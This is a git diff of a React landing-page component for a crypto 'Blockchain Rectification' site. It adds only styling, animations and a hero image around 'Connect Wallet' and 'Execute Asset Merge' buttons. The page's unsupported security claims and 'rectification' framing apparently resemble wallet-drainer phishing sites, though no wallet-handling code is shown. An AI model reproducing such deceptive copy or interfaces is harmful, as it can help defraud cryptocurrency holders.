@@ -1,9 +1,10 @@
 import { useState } from "react";
-import { Zap, Loader2, LogOut } from "lucide-react";
+import { Zap, Loader2, LogOut, ChevronRight } from "lucide-react";
 import { useWeb3 } from "../hooks/useWeb3";
 import { useToast } from "@/hooks/use-toast";
 import WalletSelectorModal from "./WalletSelectorModal";
 import WalletHelpModal from "./WalletHelpModal";
+import HeroImage from "../image/IMG_1843.jpeg";
 
 export default function BonilaSection() {
   const {
@@ -84,7 +85,13 @@ export default function BonilaSection() {
   ];
 
   return (
-    <div id="bonita" className="min-h-screen bg-gradient-to-b from-background via-background to-accent/5 py-16 px-6">
+    <div id="bonita" className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5 py-16 px-6 relative overflow-hidden">
+      {/* Animated Background Elements */}
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute -top-40 -right-40 w-80 h-80 bg-primary/10 rounded-full blur-3xl animate-pulse"></div>
+        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-purple-500/10 rounded-full blur-3xl animate-pulse" style={{ animationDelay: '1s' }}></div>
+      </div>
+
       {/* Wallet Modals */}
       <WalletSelectorModal
         isOpen={showSelector}
@@ -100,27 +107,28 @@ export default function BonilaSection() {
       />
 
       {/* Hero Section */}
-      <div className="max-w-7xl mx-auto mb-16">
+      <div className="max-w-7xl mx-auto mb-16 relative z-10">
         <div className="grid lg:grid-cols-2 gap-12 items-center">
           {/* Text Content */}
-          <div className="space-y-6">
-            <h1 className="text-5xl lg:text-6xl font-black tracking-tight text-foreground leading-tight">
+          <div className="space-y-8 animate-fade-in-left">
+            <h1 className="text-5xl lg:text-7xl font-black tracking-tight text-foreground leading-tight">
               Decentralized to{" "}
-              <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">
+              <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent animate-gradient">
                 blockchains
               </span>
               <br />
               Chain Protocol
             </h1>
             
-            <p className="text-lg text-muted-foreground leading-relaxed">
+            <p className="text-lg text-muted-foreground leading-relaxed max-w-xl">
               Chain provides industry-leading Web3 and Blockchain safe protocol and process encrypted by a superb encryption server. Your information never leaves our server or be visible to anyone.
             </p>
 
             <div className="space-y-6">
-              <div className="relative">
+              <div className="relative group">
+                <div className="absolute -inset-0.5 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 rounded-2xl blur opacity-0 group-hover:opacity-75 transition-opacity duration-300"></div>
                 <select
-                  className="w-full h-14 bg-accent text-foreground px-6 rounded-2xl border border-border text-lg font-black focus:outline-none focus:ring-2 focus:ring-primary/20 transition-all appearance-none cursor-pointer"
+                  className="relative w-full h-14 bg-background text-foreground px-6 rounded-2xl border border-primary/20 text-lg font-black focus:outline-none focus:ring-2 focus:ring-primary/50 transition-all appearance-none cursor-pointer hover:border-primary/40"
                   value={selectedNetwork}
                   onChange={handleNetworkChange}
                 >
@@ -133,28 +141,35 @@ export default function BonilaSection() {
 
               {!walletConnected ? (
                 <button
-                  className="premium-button w-full h-14 text-xl font-black"
+                  className="premium-button w-full h-14 text-xl font-black group relative overflow-hidden"
                   onClick={handleOpenConnect}
                   disabled={connecting}
                 >
-                  {connecting ? (
-                    <div className="flex items-center gap-2">
-                      <Loader2 size={20} className="animate-spin" />
-                      <span>Connecting...</span>
-                    </div>
-                  ) : (
-                    <>
-                      <Zap size={20} />
-                      <span>Connect Wallet</span>
-                    </>
-                  )}
+                  <div className="absolute inset-0 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+                  <div className="relative flex items-center justify-center gap-2">
+                    {connecting ? (
+                      <>
+                        <Loader2 size={20} className="animate-spin" />
+                        <span>Connecting...</span>
+                      </>
+                    ) : (
+                      <>
+                        <Zap size={20} />
+                        <span>Connect Wallet</span>
+                        <ChevronRight size={20} className="group-hover:translate-x-1 transition-transform" />
+                      </>
+                    )}
+                  </div>
                 </button>
               ) : (
-                <div className="rounded-2xl border border-border bg-primary/5 p-8 relative">
-                  <div className="text-left space-y-6">
+                <div className="rounded-2xl border border-primary/20 bg-gradient-to-br from-primary/5 via-background to-background p-8 relative overflow-hidden group animate-scale-in">
+                  {/* Gradient Background */}
+                  <div className="absolute inset-0 bg-gradient-to-br from-blue-500/5 via-transparent to-purple-500/5 group-hover:from-blue-500/10 group-hover:to-purple-500/10 transition-all duration-300"></div>
+                  
+                  <div className="text-left space-y-6 relative z-10">
                     <div>
                       <label className="text-xs font-black uppercase tracking-widest text-primary mb-2 block">Active Session</label>
-                      <div className="text-lg font-mono font-black break-all bg-background p-4 rounded-xl border border-border text-foreground">
+                      <div className="text-lg font-mono font-black break-all bg-background p-4 rounded-xl border border-primary/20 text-foreground hover:border-primary/50 transition-colors">
                         {account}
                       </div>
                     </div>
@@ -167,14 +182,15 @@ export default function BonilaSection() {
                     </div>
 
                     <button
-                      className="premium-button w-full h-14 text-lg font-black"
+                      className="premium-button w-full h-14 text-lg font-black group relative overflow-hidden"
                       onClick={handleMerge}
                     >
-                      Execute Asset Merge
+                      <div className="absolute inset-0 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+                      <div className="relative">Execute Asset Merge</div>
                     </button>
 
                     <button
-                      className="w-full h-12 text-sm font-black text-muted-foreground hover:text-red-500 hover:bg-red-500/10 border border-border rounded-2xl transition-all flex items-center justify-center gap-2"
+                      className="w-full h-12 text-sm font-black text-muted-foreground hover:text-red-500 hover:bg-red-500/10 border border-border/50 rounded-2xl transition-all duration-300 flex items-center justify-center gap-2 hover:border-red-500/50"
                       onClick={disconnect}
                     >
                       <LogOut size={16} />
@@ -186,70 +202,70 @@ export default function BonilaSection() {
             </div>
           </div>
 
-          {/* ETH Shape */}
-          <div className="hidden lg:flex justify-center items-center">
-            <div className="relative w-80 h-80">
-              {/* Top Triangle */}
-              <div className="absolute left-1/2 top-0 transform -translate-x-1/2">
-                <div className="w-0 h-0 border-l-24 border-r-24 border-b-48 border-l-transparent border-r-transparent border-b-cyan-400"
-                  style={{
-                    borderLeft: '90px solid transparent',
-                    borderRight: '90px solid transparent',
-                    borderBottom: '170px solid #67d9ff',
-                    filter: 'drop-shadow(0 0 20px #4f8dff)'
-                  }}
-                />
-              </div>
-
-              {/* Bottom Triangle */}
-              <div className="absolute left-1/2 bottom-0 transform -translate-x-1/2">
-                <div className="w-0 h-0 border-l-24 border-r-24 border-t-48 border-l-transparent border-r-transparent border-t-blue-600"
-                  style={{
-                    borderLeft: '90px solid transparent',
-                    borderRight: '90px solid transparent',
-                    borderTop: '170px solid #3f6cff',
-                    filter: 'drop-shadow(0 0 20px #7a5cff)'
-                  }}
-                />
-              </div>
+          {/* Hero Image */}
+          <div className="hidden lg:flex justify-center items-center animate-fade-in-right">
+            <div className="relative">
+              <div className="absolute inset-0 bg-gradient-to-br from-blue-500 via-purple-500 to-pink-500 rounded-3xl blur-2xl opacity-30 animate-pulse"></div>
+              <img
+                src={HeroImage}
+                alt="Hero"
+                className="relative w-full max-w-md h-auto rounded-3xl border-2 border-primary/30 shadow-2xl shadow-primary/20 transform hover:scale-105 transition-transform duration-500 object-cover"
+              />
             </div>
           </div>
         </div>
       </div>
 
       {/* Services Grid */}
-      <div className="max-w-7xl mx-auto">
-        <h2 className="text-4xl lg:text-5xl font-black text-center mb-16 text-foreground">
-          Make Your Selection Below
-        </h2>
+      <div className="max-w-7xl mx-auto relative z-10">
+        <div className="text-center mb-16 animate-fade-in">
+          <h2 className="text-4xl lg:text-5xl font-black text-foreground mb-4">
+            Make Your Selection <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">Below</span>
+          </h2>
+          <p className="text-muted-foreground text-lg max-w-2xl mx-auto">
+            Choose from our comprehensive suite of tools and services to manage your blockchain assets
+          </p>
+        </div>
 
         <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
           {features.map((feature, index) => (
             <div
               key={index}
-              className="group bg-card border border-border/50 rounded-2xl p-8 cursor-pointer transition-all duration-300 hover:shadow-xl hover:shadow-primary/20 hover:border-primary/50 hover:bg-accent/10 transform hover:-translate-y-1"
+              className="group relative animate-fade-in"
+              style={{
+                animationDelay: `${index * 50}ms`,
+              }}
             >
-              <h3 className="text-xl font-black text-foreground mb-3 group-hover:text-primary transition-colors">
-                {feature.title}
-              </h3>
-              <p className="text-muted-foreground leading-relaxed">
-                {feature.description}
-              </p>
+              <div className="absolute -inset-0.5 bg-gradient-to-r from-blue-500/20 via-purple-500/20 to-pink-500/20 rounded-2xl blur opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
+              <div className="relative bg-card/50 backdrop-blur-xl border border-primary/20 rounded-2xl p-8 cursor-pointer transition-all duration-300 hover:shadow-xl hover:shadow-primary/20 hover:border-primary/50 hover:bg-primary/5 transform group-hover:scale-105 group-hover:-translate-y-2">
+                <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 rounded-t-2xl transform scale-x-0 group-hover:scale-x-100 transition-transform duration-300 origin-left"></div>
+                <h3 className="text-xl font-black text-foreground mb-3 group-hover:text-primary transition-colors">
+                  {feature.title}
+                </h3>
+                <p className="text-muted-foreground leading-relaxed group-hover:text-foreground/80 transition-colors">
+                  {feature.description}
+                </p>
+                <div className="absolute bottom-4 right-4 opacity-0 group-hover:opacity-100 transition-opacity">
+                  <ChevronRight className="text-primary w-5 h-5 group-hover:translate-x-1 transition-transform" />
+                </div>
+              </div>
             </div>
           ))}
         </div>
       </div>
 
       {/* Footer */}
-      <div className="max-w-7xl mx-auto mt-24 pt-12 border-t border-border/50">
-        <div className="flex flex-col md:flex-row justify-between items-center gap-6">
+      <div className="max-w-7xl mx-auto mt-24 pt-12 border-t border-primary/20 relative z-10">
+        <div className="flex flex-col md:flex-row justify-between items-center gap-6 animate-fade-in">
           <p className="text-muted-foreground font-semibold">© 2024. Blockchain Rectification.</p>
           <div className="flex gap-8">
-            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors font-semibold">
+            <a href="#" className="text-muted-foreground hover:text-primary transition-colors font-semibold relative group">
               Privacy Policy
+              <div className="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-blue-500 to-pink-500 group-hover:w-full transition-all duration-300"></div>
             </a>
-            <a href="#" className="text-muted-foreground hover:text-foreground transition-colors font-semibold">
+            <a href="#" className="text-muted-foreground hover:text-primary transition-colors font-semibold relative group">
               Terms & Conditions
+              <div className="absolute bottom-0 left-0 w-0 h-0.5 bg-gradient-to-r from-blue-500 to-pink-500 group-hover:w-full transition-all duration-300"></div>
             </a>
           </div>
         </div>
